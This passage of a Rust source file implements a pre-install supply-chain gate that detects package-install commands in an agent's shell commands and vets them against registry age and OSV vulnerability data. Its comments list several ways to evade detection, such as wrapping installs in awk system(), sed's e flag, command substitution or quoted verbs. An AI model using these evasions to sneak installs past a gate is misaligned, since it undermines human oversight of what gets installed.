// SPDX-License-Identifier: MIT
// Part of the ContextCrawler downstream of rtk-ai/rtk.
// Copyright (c) 2026 ContextCrawler contributors.
//
//! Supply-chain pre-install gate.
//!
//! Detects npm/pnpm/yarn/pip/uv/poetry/pipx install commands in a bash
//! command string, queries the relevant registry (npm or PyPI) for the
//! latest version's publish time, and OSV.dev for known vulnerabilities.
//! Returns a Verdict the caller (hook_cmd / rewrite_cmd) uses to downgrade
//! the auto-allow decision when packages fail an age cooldown or carry
//! HIGH-severity CVEs.
//!
//! Empirical justification for defaults: see
//!   notes/research/supply-chain-audit-report.md
//! in the umbrella repo.
//!
//! Subprocess-free internal HTTP via `ureq` (already a ContextCrawler dep).

use anyhow::Result;
use chrono::{DateTime, Duration as ChronoDuration, Utc};
use lazy_static::lazy_static;
use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::fs;
use std::io::Write;
use std::path::PathBuf;
use std::sync::OnceLock;
use std::time::{Duration as StdDuration, Instant};

// ---------------------------------------------------------------------------
// SEC-I2: aggregate budget + package cap
// ---------------------------------------------------------------------------

/// Aggregate wall-clock budget for an entire `check()` call. Each registry /
/// OSV request carries its own 8s timeout; without an aggregate cap a command
/// installing many packages against a slow/hostile registry could stall the
/// hook for minutes. Once this budget is exceeded `check()` stops vetting and
/// fails closed to `Ask`/`Unavailable`.
const CHECK_WALL_BUDGET: StdDuration = StdDuration::from_secs(25);

/// Maximum number of distinct packages `check()` will vet in one command.
/// Beyond this the install is too large to vet within budget — fail closed to
/// `Ask` ("too many packages to vet") rather than issuing dozens of requests.
const MAX_PACKAGES_PER_CHECK: usize = 20;

// ---------------------------------------------------------------------------
// Public types
// ---------------------------------------------------------------------------

#[derive(Debug)]
pub enum Verdict {
    /// Gate disabled, or command contains no install actions. Caller proceeds normally.
    Skip,
    /// All checks passed.
    Allow,
    /// One or more packages failed the gate. Caller should refuse the auto-allow.
    Block(Vec<Finding>),
    /// The install verb was detected but its package set cannot be vetted
    /// (lockfile / requirements / constraints install — no nameable package).
    /// Not a hard failure: callers fail CLOSED by downgrading the auto-allow
    /// to Ask so the user confirms the unvetted set, rather than waving it
    /// through (Skip) or hard-refusing it (Block).
    Ask(Vec<Finding>),
    /// Network or other transient failure (TOML parse, registry timeout,
    /// OSV lookup error). Callers fail CLOSED: the auto-allow is downgraded
    /// to Ask so the user is prompted rather than the install waved through.
    Unavailable(String),
}

#[derive(Debug, Clone, Serialize)]
pub struct Finding {
    pub package: String,
    pub ecosystem: String,
    pub reason: FindingReason,
    pub severity: Severity,
}

#[derive(Debug, Clone, Serialize)]
#[serde(tag = "kind")]
pub enum FindingReason {
    RecentRelease {
        age_days: f64,
        cooldown_days: u32,
        version: String,
    },
    KnownVulnerability {
        id: String,
        summary: String,
    },
    /// The install command contained an editable / path / URL token (e.g.
    /// `-e .`, `git+...`, `https://...`) and the ecosystem config does not
    /// allow these to bypass review.
    UnvettableSource {
        token_kind: String,
    },
    /// An install verb was detected but no package name is resolvable: the
    /// install pulls its package set from a lockfile / requirements file /
    /// constraints file the gate cannot enumerate or query. Examples:
    /// `npm install` / `npm ci` with no args, `pip install -r requirements.txt`.
    /// Fails closed to Ask so the unvetted set is surfaced to the user.
    UnvettableInstall {
        detail: String,
    },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
#[serde(rename_all = "UPPERCASE")]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}

impl Severity {
    fn parse(s: &str) -> Option<Self> {
        match s.to_ascii_uppercase().as_str() {
            "LOW" => Some(Severity::Low),
            "MEDIUM" | "MED" | "MODERATE" => Some(Severity::Medium),
            "HIGH" => Some(Severity::High),
            "CRITICAL" => Some(Severity::Critical),
            _ => None,
        }
    }
}

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

#[derive(Debug, Deserialize)]
struct Config {
    #[serde(default)]
    supply_chain: GlobalConfig,
    #[serde(default = "default_npm")]
    npm: EcosystemConfig,
    #[serde(default = "default_pypi")]
    pypi: EcosystemConfig,
    #[serde(default)]
    overrides: Overrides,
}

#[derive(Debug, Deserialize, Default)]
struct GlobalConfig {
    #[serde(default)]
    enabled: bool,
}

#[derive(Debug, Deserialize, Clone)]
struct EcosystemConfig {
    #[serde(default = "default_cooldown")]
    cooldown_days: u32,
    #[serde(default = "default_severity")]
    block_severity: String,
    #[serde(default)]
    allow_editable: bool,
}

#[derive(Debug, Deserialize, Default)]
struct Overrides {
    #[serde(default)]
    always_allow: Vec<String>,
    #[serde(default)]
    always_deny: Vec<String>,
}

fn default_cooldown() -> u32 {
    3
}

fn default_severity() -> String {
    "HIGH".into()
}

fn default_npm() -> EcosystemConfig {
    EcosystemConfig {
        cooldown_days: 3,
        block_severity: "HIGH".into(),
        allow_editable: false,
    }
}

fn default_pypi() -> EcosystemConfig {
    EcosystemConfig {
        cooldown_days: 3,
        block_severity: "HIGH".into(),
        allow_editable: true,
    }
}

impl Default for Config {
    fn default() -> Self {
        Self {
            supply_chain: GlobalConfig { enabled: false },
            npm: default_npm(),
            pypi: default_pypi(),
            overrides: Overrides::default(),
        }
    }
}

/// Where to look for the supply-chain config.
/// Search order (first hit wins):
///   1. `$XDG_CONFIG_HOME/contextcrawler/supply-chain.toml`
///   2. `~/.config/contextcrawler/supply-chain.toml` (developer-friendly on macOS)
///   3. `dirs::config_dir()/contextcrawler/supply-chain.toml`
///      (= ~/Library/Application Support on macOS, ~/.config on Linux, AppData on Windows)
fn config_candidates() -> Vec<PathBuf> {
    let mut out = Vec::new();
    if let Ok(xdg) = std::env::var("XDG_CONFIG_HOME") {
        out.push(
            PathBuf::from(xdg)
                .join("contextcrawler")
                .join("supply-chain.toml"),
        );
    }
    if let Some(home) = dirs::home_dir() {
        out.push(home.join(".config/contextcrawler/supply-chain.toml"));
    }
    if let Some(cfg) = dirs::config_dir() {
        out.push(cfg.join("contextcrawler").join("supply-chain.toml"));
    }
    out
}

/// Read the supply-chain config from disk (first candidate that exists wins).
fn read_config_from_disk() -> Config {
    for path in config_candidates() {
        if let Ok(content) = fs::read_to_string(&path) {
            return toml::from_str(&content).unwrap_or_default();
        }
    }
    Config::default()
}

/// Process-lifetime cache for the supply-chain config.
///
/// The gate now runs on EVERY hook-routed Bash command (the hottest path in
/// the tool), so an uncached `load_config()` would hit disk on every agent
/// command even when the gate is disabled. The hook process is short-lived
/// (one invocation per agent command) so a process-lifetime cache is correct;
/// even if the hook ran long-lived, config doesn't change mid-process so the
/// cache stays valid. Codex-review follow-up for #100.
static CONFIG_CACHE: OnceLock<Config> = OnceLock::new();

/// Returns the supply-chain config, reading disk at most once per process.
fn load_config() -> &'static Config {
    CONFIG_CACHE.get_or_init(read_config_from_disk)
}

// ---------------------------------------------------------------------------
// Command parsing
// ---------------------------------------------------------------------------

#[derive(Debug, Clone)]
struct ParsedInstall {
    ecosystem: Ecosystem,
    /// (package_name, optional_pinned_version)
    packages: Vec<ParsedPackage>,
    has_editable: bool,
    /// Set when the install resolves its package set from a file the gate
    /// cannot enumerate or query: pip `-r`/`--requirement`/`-c`/`--constraint`,
    /// or a bare lockfile install (`npm install`/`npm ci` with no package
    /// args). The string is a short human-readable description of the source.
    unvettable: Option<String>,
}

type ParsedPackage = (String, Option<String>);
type ParsedPackageArgs = (Vec<ParsedPackage>, bool, Option<String>);

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
enum Ecosystem {
    Npm,
    Pypi,
    /// Ecosystem-agnostic finding. Used for synthetic `ParsedInstall`s
    /// emitted in fail-closed paths where the gate detected something
    /// install-shaped but cannot resolve the actual ecosystem (e.g. the
    /// recursion-depth cap surfacing a nested payload it refuses to
    /// inspect). Always paired with `unvettable: Some(...)` so the caller
    /// short-circuits to `Verdict::Ask` before any registry routing or
    /// config lookup is attempted. See #147.
    Unknown,
}

impl Ecosystem {
    fn as_str(&self) -> &'static str {
        match self {
            Ecosystem::Npm => "npm",
            Ecosystem::Pypi => "PyPI",
            Ecosystem::Unknown => "unknown",
        }
    }
}

// Combined regex contract — both #143 (develop) and #140 layered:
//
// Prefix anchor `(?:^|[\s;/\\'"]|&&|\|\|)` treats whitespace, `;`, `&&`,
// `||`, `/`, `\`, `'`, and `"` as command-start delimiters:
//   - `/` and `\` close the absolute / relative path bypass (#139).
//   - `'` and `"` close the quoted-head bypass (#140) — `'npm' install x`
//     / `"pip" install x` are detected via the quote-as-anchor + an
//     optional closing quote after the verb (`['"]?` immediately after).
//
// Verb tokens use `(?i:…)` so `NPM`, `Npm` etc. classify alongside `npm`.
// The pip verb also covers versioned launchers — `pip\d*(?:\.\d+)*`
// matches `pip`, `pip3`, `pip3.12`, etc.
//
// After the verb (and optional closing quote) `(?:\.(?i:cmd|exe|bat))*`
// absorbs Windows launchers (`npm.cmd`, `npm.cmd.exe`, `NPM.CMD`) —
// chained extensions collapse for free.
//
// The capture group excludes `\r\n` so a multi-line script does not
// chain-swallow the next line. Line-continuation backslashes are
// collapsed BEFORE matching by `LINE_CONT_RE` in `detect_installs`. The
// outer command is also pre-masked by `mask_quoted_operators` so a
// literal `&` / `|` / `;` inside a quoted flag value does not truncate
// the package scan.
lazy_static! {
    // Backslash + line-ending + indentation = shell line-continuation.
    // Collapsed to a single space before install detection. Covers POSIX
    // (`\n`), Windows (`\r\n`), AND legacy Mac (`\r` alone). Restrict the
    // suffix to horizontal whitespace: `\s*` also swallowed a later,
    // unescaped newline and merged distinct shell commands (#227 round 2).
    static ref LINE_CONT_RE: Regex = Regex::new(r"\\(?:\r\n|\n|\r)[ \t]*").unwrap();
    // Verb subcommand wrapped in `['"]?…['"]?` — closes the BLOCKER both
    // reviewers flagged on #146: `npm 'install' lodash` / `pip "install" x`
    // would otherwise bypass (regex doesn't match the quoted subcommand,
    // and the bare-install scan sees `lodash` as a package → silent skip).
    static ref NPM_RE: Regex = Regex::new(
        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:npm)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:i|install|add)['"]?[ \t]+([^|;&<>\r\n]+)"#
    )
    .unwrap();
    static ref PNPM_RE: Regex = Regex::new(
        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pnpm)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:i|install|add)['"]?[ \t]+([^|;&<>\r\n]+)"#
    )
    .unwrap();
    static ref PNPM_UPDATE_RE: Regex = Regex::new(
        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pnpm)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:update)['"]?[ \t]+([^|;&<>\r\n]+)"#
    )
    .unwrap();
    static ref YARN_RE: Regex = Regex::new(
        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:yarn)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:add)['"]?[ \t]+([^|;&<>\r\n]+)"#
    )
    .unwrap();
    static ref PIP_RE: Regex = Regex::new(
        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pip\d*(?:\.\d+)*)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:install)['"]?[ \t]+([^|;&<>\r\n]+)"#
    )
    .unwrap();
    static ref UV_RE: Regex = Regex::new(
        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:uv)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+(?:['"]?(?i:pip)['"]?[ \t]+)?['"]?(?i:install|add)['"]?[ \t]+([^|;&<>\r\n]+)"#
    )
    .unwrap();
    static ref POETRY_RE: Regex = Regex::new(
        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:poetry)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:add)['"]?[ \t]+([^|;&<>\r\n]+)"#
    )
    .unwrap();
    static ref POETRY_UPDATE_RE: Regex = Regex::new(
        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:poetry)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:update)['"]?[ \t]+([^|;&<>\r\n]+)"#
    )
    .unwrap();
    static ref PIPX_RE: Regex = Regex::new(
        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pipx)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:install)['"]?[ \t]+([^|;&<>\r\n]+)"#
    )
    .unwrap();
    // #144 — bun (JS/TS → npm registry). Subcommand set mirrors npm:
    // `bun install <pkg>`, `bun add <pkg>`, `bun i <pkg>`.
    static ref BUN_RE: Regex = Regex::new(
        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:bun)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:i|install|add)['"]?[ \t]+([^|;&<>\r\n]+)"#
    )
    .unwrap();
    // #144 — PDM (Python → PyPI). `pdm add <pkg>` is the package-bearing
    // form; `pdm install` / `pdm sync` are bare-lockfile (handled below).
    static ref PDM_RE: Regex = Regex::new(
        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pdm)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:add)['"]?[ \t]+([^|;&<>\r\n]+)"#
    )
    .unwrap();
    // #144 — Pipenv (Python → PyPI). `pipenv install <pkg>` is dual: bare =
    // lockfile (handled below), with a pkg = package-bearing (this regex).
    static ref PIPENV_RE: Regex = Regex::new(
        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:pipenv)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:install)['"]?[ \t]+([^|;&<>\r\n]+)"#
    )
    .unwrap();
    // #144 — conda. Mapped to PyPI as the closest bucket, but ALWAYS surfaced
    // as unvettable (packages resolve from conda channels, not PyPI). Covers
    // `conda install <pkg>` and `conda create -n <env> <pkg>`.
    static ref CONDA_RE: Regex = Regex::new(
        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:conda)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:install|create)['"]?[ \t]+([^|;&<>\r\n]+)"#
    )
    .unwrap();
    // #144 — mamba (conda drop-in). Same caveat as conda — unvettable. Covers
    // `mamba install <pkg>` AND `mamba create -n <env> <pkg>` (mirrors CONDA_RE).
    static ref MAMBA_RE: Regex = Regex::new(
        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:mamba)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:install|create)['"]?[ \t]+([^|;&<>\r\n]+)"#
    )
    .unwrap();
    static ref BREW_RE: Regex = Regex::new(
        r#"(?m)(?:^|[\s;/\\'"]|&&|\|\|)(?i:brew)['"]?(?:\.(?i:cmd|exe|bat))*[ \t]+['"]?(?i:install)['"]?[ \t]+([^|;&<>\r\n]+)"#
    )
    .unwrap();
}

/// Tokenise a shell command into (offset, token-text) pairs.
///
/// Shell operators `&&`, `||`, `;`, `|`, `>`, `>>`, `<`, `<<` become their
/// own tokens — but only when seen OUTSIDE quotes. Inside `'…'`, `"…"`, or
/// `$'…'` the operator characters are part of the surrounding word.
///
/// The token text is the *literal payload* with surrounding quote characters
/// stripped — `'npm'` becomes `npm`, `"pip"` becomes `pip`. This lets the
/// bare-install scan in [`detect_bare_lockfile_installs`] match a quoted
/// install head against `"npm"` / `"pnpm"` / `"yarn"` without special casing.
///
/// Command-substitution payloads (`$(…)`, backticks) are NOT emitted as
/// tokens here — they are extracted separately by
/// [`extract_recursion_segments`] so [`detect_installs`] can recurse into
/// them. The substitution body still consumes its source span so subsequent
/// tokens align on byte offsets in the *original* command.
///
/// Unmatched quotes, substitutions, and trailing escapes are errors. The
/// caller turns an install-shaped tokenisation failure into an unvettable
/// finding; silently returning a best-effort token stream would fail open.
///
/// ANSI-C `$'…'` quotes are treated as single quotes for tokenising — we
/// do not interpret `\n`/`\t` escapes because the gate only needs the verb
/// surface, not the byte-perfect payload.
fn shell_tokens(cmd: &str) -> std::result::Result<Vec<(usize, String)>, &'static str> {
    let mut out = Vec::new();
    let bytes = cmd.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let c = bytes[i] as char;
        // An unescaped line ending terminates a shell command. Preserve it as
        // an operator token rather than dropping it as generic whitespace;
        // otherwise `npm install\nnext-command` is reconstructed as one
        // package-bearing invocation and the real lockfile install is missed.
        if c == '\n' || c == '\r' {
            let start = i;
            if c == '\r' && i + 1 < bytes.len() && bytes[i + 1] == b'\n' {
                i += 2;
            } else {
                i += 1;
            }
            out.push((start, "\n".to_string()));
            continue;
        }
        if c.is_whitespace() {
            i += 1;
            continue;
        }
        // Shell operators become their own tokens — outside quotes only.
        if c == ';' || c == '|' || c == '&' || c == '>' || c == '<' {
            let start = i;
            let mut j = i + 1;
            // Group repeated operator chars (`&&`, `||`, `>>`, `<<`).
            while j < bytes.len() && (bytes[j] as char) == c {
                j += 1;
            }
            out.push((start, cmd[start..j].to_string()));
            i = j;
            continue;
        }
        // Ordinary word: run until whitespace or an *unquoted* operator,
        // accumulating the literal payload (quotes stripped, substitution
        // bodies copied verbatim so the offset arithmetic in callers stays
        // honest).
        let start = i;
        let mut payload = String::new();
        let mut j = i;
        while j < bytes.len() {
            let cj = bytes[j] as char;
            if cj.is_whitespace() || cj == ';' || cj == '|' || cj == '&' || cj == '>' || cj == '<' {
                break;
            }
            // Single quote: literal — no expansion, no escape, ends at next `'`.
            if cj == '\'' {
                let q_start = j + 1;
                let mut k = q_start;
                while k < bytes.len() && (bytes[k] as char) != '\'' {
                    k += 1;
                }
                if k == bytes.len() {
                    return Err("unterminated single quote");
                }
                payload.push_str(&cmd[q_start..k]);
                j = k + 1;
                continue;
            }
            // ANSI-C $'…' quote: same shape as single quote for our purposes.
            if cj == '$' && j + 1 < bytes.len() && (bytes[j + 1] as char) == '\'' {
                let q_start = j + 2;
                let mut k = q_start;
                while k < bytes.len() && (bytes[k] as char) != '\'' {
                    // Honour `\'` escape so the inner quote does not terminate.
                    if (bytes[k] as char) == '\\' && k + 1 < bytes.len() {
                        k += 2;
                        continue;
                    }
                    k += 1;
                }
                if k == bytes.len() {
                    return Err("unterminated ANSI-C quote");
                }
                payload.push_str(&cmd[q_start..k]);
                j = k + 1;
                continue;
            }
            // Double quote: no operator splitting, no expansion. `\"` is the
            // only escape we honour (the only one that matters for finding
            // the closing quote). `$(…)` and backticks INSIDE a double-quoted
            // string still execute, so we copy the body verbatim — the
            // top-level recursion sweep finds substitutions anywhere in the
            // command, including inside double quotes.
            if cj == '"' {
                let q_start = j + 1;
                let mut k = q_start;
                while k < bytes.len() {
                    let cc = bytes[k] as char;
                    if cc == '\\' && k + 1 < bytes.len() {
                        k += 2;
                        continue;
                    }
                    if cc == '"' {
                        break;
                    }
                    k += 1;
                }
                if k == bytes.len() {
                    return Err("unterminated double quote");
                }
                payload.push_str(&cmd[q_start..k]);
                j = k + 1;
                continue;
            }
            // Command substitution `$(…)`: consume balanced. The body is
            // exposed via extract_recursion_segments, not as a token here —
            // but the source span still has to be skipped so word boundaries
            // align with the original command.
            if cj == '$' && j + 1 < bytes.len() && (bytes[j + 1] as char) == '(' {
                let body_start = j + 2;
                let k = scan_balanced_paren(cmd, body_start);
                if k == bytes.len() {
                    return Err("unterminated command substitution");
                }
                // Copy body verbatim into the payload so any package-name
                // text that lives at the same shell-word level (e.g. an
                // adversary writing `npm$(echo )install foo`) does not
                // disappear from the regex pass.
                payload.push_str(&cmd[body_start..k]);
                j = k + 1;
                continue;
            }
            // Backtick substitution: same role as `$(…)`, single-level only.
            if cj == '`' {
                let body_start = j + 1;
                let mut k = body_start;
                while k < bytes.len() && (bytes[k] as char) != '`' {
                    if (bytes[k] as char) == '\\' && k + 1 < bytes.len() {
                        k += 2;
                        continue;
                    }
                    k += 1;
                }
                if k == bytes.len() {
                    return Err("unterminated backtick substitution");
                }
                payload.push_str(&cmd[body_start..k]);
                j = k + 1;
                continue;
            }
            // Backslash escape outside quotes: skip one char.
            if cj == '\\' && j + 1 < bytes.len() {
                payload.push(bytes[j + 1] as char);
                j += 2;
                continue;
            }
            if cj == '\\' {
                return Err("trailing backslash escape");
            }
            payload.push(cj);
            j += 1;
        }
        out.push((start, payload));
        i = j;
    }
    Ok(out)
}

/// Scan forward from `start` (which should point just past the opening `(`)
/// to the matching closing `)`. Returns the index of that `)`, or
/// `cmd.len()` if no match was found (unmatched — best effort, no panic).
/// Nested `(` increment the depth; quoted regions are honoured so a `)`
/// inside `'…'` or `"…"` does not close the substitution.
fn scan_balanced_paren(cmd: &str, start: usize) -> usize {
    let bytes = cmd.as_bytes();
    let mut k = start;
    let mut depth: i32 = 1;
    while k < bytes.len() {
        let c = bytes[k] as char;
        match c {
            '(' => depth += 1,
            ')' => {
                depth -= 1;
                if depth == 0 {
                    return k;
                }
            }
            '\'' => {
                k += 1;
                while k < bytes.len() && (bytes[k] as char) != '\'' {
                    k += 1;
                }
            }
            '"' => {
                k += 1;
                while k < bytes.len() {
                    let cc = bytes[k] as char;
                    if cc == '\\' && k + 1 < bytes.len() {
                        k += 2;
                        continue;
                    }
                    if cc == '"' {
                        break;
                    }
                    k += 1;
                }
            }
            '\\' if k + 1 < bytes.len() => {
                k += 1;
            }
            _ => {}
        }
        k += 1;
    }
    bytes.len()
}

/// Extract recursion segments: payloads of `sh -c <arg>` / `bash -c <arg>`,
/// command-substitution bodies `$(…)`, and backtick bodies. Returned strings
/// are the *literal inner command text* — the caller re-runs the full
/// install detector on each one to close the wrapped-install bypass class.
///
/// Representation choice: a flat `Vec<String>` of inner commands rather than
/// in-band tokens. This keeps the offset/dedup contract of `shell_tokens`
/// intact (offsets always refer to the original cmd) and isolates recursion
/// to a single explicit pass in `detect_installs`. Each segment is treated as
/// an independent command — no offset is needed because spans in the inner
/// command would not align with the outer claimed-span dedup anyway.
fn extract_recursion_segments(cmd: &str) -> Vec<String> {
    let mut out = Vec::new();
    let bytes = cmd.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let c = bytes[i] as char;
        // `$(…)` substitution.
        if c == '$' && i + 1 < bytes.len() && (bytes[i + 1] as char) == '(' {
            let body_start = i + 2;
            let end = scan_balanced_paren(cmd, body_start);
            if end > body_start && end <= bytes.len() {
                out.push(cmd[body_start..end].to_string());
            }
            i = if end < bytes.len() { end + 1 } else { end };
            continue;
        }
        // Backtick substitution.
        if c == '`' {
            let body_start = i + 1;
            let mut k = body_start;
            while k < bytes.len() && (bytes[k] as char) != '`' {
                if (bytes[k] as char) == '\\' && k + 1 < bytes.len() {
                    k += 2;
                    continue;
                }
                k += 1;
            }
            if k > body_start && k <= bytes.len() {
                out.push(cmd[body_start..k.min(bytes.len())].to_string());
            }
            i = if k < bytes.len() { k + 1 } else { k };
            continue;
        }
        // Single-quoted: skip without recursion (no expansion happens inside).
        if c == '\'' {
            let mut k = i + 1;
            while k < bytes.len() && (bytes[k] as char) != '\'' {
                k += 1;
            }
            i = if k < bytes.len() { k + 1 } else { k };
            continue;
        }
        // Double-quoted: recurse for `$(…)` / backticks inside (they DO
        // execute inside `"…"`), but the literal characters between are not
        // word-split — we still scan for substitutions.
        if c == '"' {
            let mut k = i + 1;
            while k < bytes.len() {
                let cc = bytes[k] as char;
                if cc == '\\' && k + 1 < bytes.len() {
                    k += 2;
                    continue;
                }
                if cc == '"' {
                    break;
                }
                // Surface substitutions inside double quotes.
                if cc == '$' && k + 1 < bytes.len() && (bytes[k + 1] as char) == '(' {
                    let body_start = k + 2;
                    let end = scan_balanced_paren(cmd, body_start);
                    if end > body_start && end <= bytes.len() {
                        out.push(cmd[body_start..end].to_string());
                    }
                    k = if end < bytes.len() { end + 1 } else { end };
                    continue;
                }
                if cc == '`' {
                    let body_start = k + 1;
                    let mut m = body_start;
                    while m < bytes.len() && (bytes[m] as char) != '`' {
                        if (bytes[m] as char) == '\\' && m + 1 < bytes.len() {
                            m += 2;
                            continue;
                        }
                        m += 1;
                    }
                    if m > body_start && m <= bytes.len() {
                        out.push(cmd[body_start..m.min(bytes.len())].to_string());
                    }
                    k = if m < bytes.len() { m + 1 } else { m };
                    continue;
                }
                k += 1;
            }
            i = if k < bytes.len() { k + 1 } else { k };
            continue;
        }
        i += 1;
    }

    // `sh -c <arg>` / `bash -c <arg>` (and friends): pull the argument that
    // follows the `-c` option. Combined short-option clusters like `-lc`,
    // `-xc`, `-x -c`, and POSIX-legal orderings like `bash -c -e '<cmd>'`
    // were a confirmed bypass (agy + Codex HIGH on #146): the original
    // exact-`-c` match missed every form except the canonical one.
    //
    // Strategy: locate a shell head (`sh`/`bash`/`zsh`/`dash`/`ksh`), then
    // scan forward through short-option clusters for one whose final
    // character is `c`. The next token after the matching cluster is the
    // command body. A long option (`--`) or non-option token before `-c`
    // ends the scan without recursion.
    let Ok(toks) = shell_tokens(cmd) else {
        return out;
    };
    let mut idx = 0;
    while idx < toks.len() {
        let head = installer_basename(toks[idx].1.as_str()).to_ascii_lowercase();
        if matches!(head.as_str(), "sh" | "bash" | "zsh" | "dash" | "ksh") {
            // Scan forward for a short-option cluster containing `c`.
            let mut scan = idx + 1;
            let mut body_idx: Option<usize> = None;
            while scan < toks.len() {
                let t = toks[scan].1.as_str();
                if t.starts_with("--") {
                    // Long option: stop without recursion.
                    break;
                }
                if t.starts_with('-') && t.len() >= 2 && t.contains('c') {
                    body_idx = Some(scan + 1);
                    break;
                }
                if !t.starts_with('-') {
                    // Non-option token before `-c`: this isn't a `-c` form
                    // (e.g. `bash script.sh` — a script-file invocation,
                    // not in scope for body extraction).
                    break;
                }
                scan += 1;
            }
            if let Some(mut b) = body_idx {
                if b < toks.len() && toks[b].1 == "--" {
                    b += 1;
                }
                if b < toks.len() {
                    out.push(toks[b].1.clone());
                }
                idx = b + 1;
                continue;
            }
        }
        idx += 1;
    }

    out
}

/// Return a same-length copy of `cmd` where shell operator characters
/// (`&`, `|`, `;`, `>`, `<`) inside quoted regions are replaced by spaces.
/// The package-list regexes use `[^|;&<>]+` to bound the package arg list;
/// without masking, a literal `&` in `--description="install & test"` cuts
/// the scan short and the package after the flag is lost.
///
/// Lengths are preserved byte-for-byte so any byte offsets produced from
/// the masked string still align with the original `cmd` (no
/// re-tokenisation needed downstream).
fn mask_quoted_operators(cmd: &str) -> String {
    let bytes = cmd.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        let c = bytes[i] as char;
        if c == '\'' {
            out.push(b'\'');
            i += 1;
            while i < bytes.len() && (bytes[i] as char) != '\'' {
                let ch = bytes[i];
                out.push(if matches!(ch, b'&' | b'|' | b';' | b'>' | b'<') {
                    b' '
                } else {
                    ch
                });
                i += 1;
            }
            if i < bytes.len() {
                out.push(b'\'');
                i += 1;
            }
            continue;
        }
        if c == '"' {
            out.push(b'"');
            i += 1;
            while i < bytes.len() {
                let cc = bytes[i] as char;
                if cc == '\\' && i + 1 < bytes.len() {
                    out.push(bytes[i]);
                    out.push(bytes[i + 1]);
                    i += 2;
                    continue;
                }
                if cc == '"' {
                    out.push(b'"');
                    i += 1;
                    break;
                }
                let ch = bytes[i];
                out.push(if matches!(ch, b'&' | b'|' | b';' | b'>' | b'<') {
                    b' '
                } else {
                    ch
                });
                i += 1;
            }
            continue;
        }
        // ANSI-C $'…': mask like single quotes.
        if c == '$' && i + 1 < bytes.len() && (bytes[i + 1] as char) == '\'' {
            out.push(b'$');
            out.push(b'\'');
            i += 2;
            while i < bytes.len() && (bytes[i] as char) != '\'' {
                if (bytes[i] as char) == '\\' && i + 1 < bytes.len() {
                    out.push(bytes[i]);
                    out.push(bytes[i + 1]);
                    i += 2;
                    continue;
                }
                let ch = bytes[i];
                out.push(if matches!(ch, b'&' | b'|' | b';' | b'>' | b'<') {
                    b' '
                } else {
                    ch
                });
                i += 1;
            }
            if i < bytes.len() {
                out.push(b'\'');
                i += 1;
            }
            continue;
        }
        out.push(bytes[i]);
        i += 1;
    }
    // Safety: we only ever copied valid UTF-8 bytes through (the masked
    // chars are ASCII space). `from_utf8` cannot fail here, but we still
    // fall back to `from_utf8_lossy` to honour the no-panic contract.
    String::from_utf8(out).unwrap_or_else(|e| String::from_utf8_lossy(&e.into_bytes()).into_owned())
}

/// True if a token is a shell operator delimiter (not a package name).
fn is_shell_operator(tok: &str) -> bool {
    matches!(
        tok,
        ";" | "|" | "||" | "&" | "&&" | ">" | ">>" | "<" | "<<" | "\n"
    )
}

/// Data-consuming utilities — their argv is data, not a command-of-commands.
/// When the head verb of a command segment is one of these, install-shaped
/// substrings inside that segment are treated as plain data (not real install
/// invocations) and the gate suppresses detection for that segment.
///
/// This is the #141 pragmatic bandaid (approach 1 of three): a head-verb
/// allowlist. Approaches (2) "token-position constraint" and (3) "quote-
/// context exclusion" remain the more principled fixes; this list should
/// shrink (or retire) once they ship.
///
/// Kept deliberately narrow: only utilities whose canonical role is to EMIT
/// or SEARCH their argv as data. Stateful utilities like `cd`, `env`,
/// `xargs`, `sudo`, `nohup` are NOT on the list — they invoke a subsequent
/// command and that command is the real head.
///
/// **EXCLUDED (deliberately) — execution-capable utilities** (agy + Codex
/// BLOCKERs on PR #148): tools that can execute arbitrary shell as a
/// side effect of normal flags do NOT belong on a "data only" allowlist,
/// because masking their segment hides any install verb from the gate
/// while the runtime still spawns it.
///
/// Confirmed execution-capable, NEVER mask:
///   - `awk` / `gawk` / `mawk` — Turing-complete with `system()`:
///     `awk 'BEGIN { system("npm install evil") }'`
///   - GNU `sed` — `s///e` flag runs the replacement as a shell command:
///     `sed 's/.*/npm install .../e'`
///   - `rg` (ripgrep) — `--pre <executable>` runs the preprocessor on
